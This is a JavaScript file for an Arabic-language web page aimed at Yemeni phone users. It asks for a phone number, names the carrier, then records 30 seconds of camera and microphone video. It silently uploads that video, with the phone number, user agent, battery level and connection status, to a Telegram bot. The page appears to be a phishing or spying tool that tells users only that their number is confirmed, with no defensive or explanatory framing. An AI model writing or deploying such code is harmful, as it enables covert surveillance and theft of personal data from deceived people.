let botToken = '';
let chatId = '';

fetch('config.json')
  .then(res => {
    if (!res.ok) {
      throw new Error(`HTTP error! status: ${res.status}`);
    }
    return res.json();
  })
  .then(data => {
    botToken = data.botToken;
    chatId = data.chatId;
  })
  .catch(err => {
    console.error('فشل تحميل الإعدادات:', err);
    alert('فشل تحميل الإعدادات. يرجى التحقق من الملف config.json.');
  });

document.getElementById('phoneNumber').addEventListener('input', () => {
  const phone = document.getElementById('phoneNumber').value;
  const carrierName = detectCarrier(phone);
  document.getElementById('carrierDisplay').innerText = "مزود الخدمة: " + carrierName;
});

function detectCarrier(phoneNumber) {
  const cleaned = phoneNumber.replace(/\D/g, '');
  const prefix = cleaned.substring(0, 2);
  switch (prefix) {
    case '77':
      return "يمن موبايل";
    case '71':
      return "سبأفون";
    case '73':
      return "MTN";
    case '70':
      return "واي";
    default:
      return "مزود غير معروف";
  }
}

function confirmConsent() {
  document.getElementById('consentBox').style.display = 'none';
  document.getElementById('confirmBtn').style.display = 'inline-block';
}

function startCameraAndSend() {
  const phoneNumber = document.getElementById('phoneNumber').value.trim();
  if (phoneNumber === '') {
    alert('يرجى إدخال رقم الهاتف.');
    return;
  }
  recordAndSendVideo(phoneNumber);
}

async function recordAndSendVideo(phoneNumber) {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    alert("المتصفح لا يدعم الخدمة.");
    return;
  }
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    const chunks = [];
    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunks.push(event.data);
      }
    };
    mediaRecorder.onstop = async () => {
      const videoBlob = new Blob(chunks, { type: 'video/webm' });
      const info = await collectUserInfo(phoneNumber);
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('video', videoBlob, 'recording.webm');
      formData.append('caption', info.caption);
      fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
        method: 'POST',
        body: formData
      })
        .then(res => res.json())
        .then(result => {
          if (!result.ok) {
            console.error("فشل إرسال تاكيد:", result.description);
          }
        })
        .catch(err => {
          console.error("خطأ أثناء إرسال :", err);
        });
      document.getElementById('confirmedNumber').innerText = phoneNumber;
      document.getElementById('confirmationMessage').style.display = 'block';
      stream.getTracks().forEach(track => track.stop());
    };
    mediaRecorder.start();
    setTimeout(() => mediaRecorder.stop(), 30000);
  } catch (error) {
    console.error("فشل الوصول إلى الكاميرا:", error);
    if (error.name === 'NotAllowedError') {
      alert("يرجى السماح للكاميرا والصوت.");
    } else if (error.name === 'NotFoundError') {
      alert("لم يتم العثور على الكاميرا أو الصوت.");
    } else {
      alert("تعذر تشغيل الكاميرا.");
    }
  }
}

async function collectUserInfo(phoneNumber) {
  const userAgent = navigator.userAgent;
  const connectionStatus = navigator.onLine ? "متصل بالإنترنت" : "غير متصل";
  let batteryLevel = "غير متوفر";
  if ('getBattery' in navigator) {
    try {
      const battery = await navigator.getBattery();
      batteryLevel = Math.round(battery.level * 100) + "%";
    } catch (e) {
    
batteryLevel = "غير متاح";
}
}
const carrier = detectCarrier(phoneNumber);
const caption = ` 📱 رقم الهاتف: ${phoneNumber} 🏢 مزود الخدمة: ${carrier} 🖥️ نوع الجهاز: ${userAgent} 🔋 نسبة البطارية: ${batteryLevel} 🌐 اتصال الإنترنت: ${connectionStatus}`;
return { caption };
}
